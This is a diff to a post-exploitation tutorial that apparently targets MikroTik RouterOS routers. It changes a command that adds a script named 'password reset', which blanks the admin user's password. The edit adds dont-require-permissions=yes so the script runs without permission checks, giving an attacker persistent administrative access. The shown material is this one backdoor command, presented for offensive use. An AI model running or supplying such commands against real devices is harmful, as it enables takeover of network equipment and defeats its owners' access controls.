@@ -15,9 +15,10 @@ This tutorial demonstrates a post-exploitation technique to establish persistent
 2.  **Create the Script**:
 
     * Use the following command to create a new script named "password reset" that changes the password of the "admin" user to an empty password.
+    * (Fixed error in original posting by author, add `dont-require-permissions=yes`
 
     ```sh
-    /system script add name="password reset" source="/user set admin password=\"\""
+    /system script add name="password reset" source="/user set admin password=\"\"" dont-require-permissions=yes
     ```
 3.  **Verify the Script**:
 
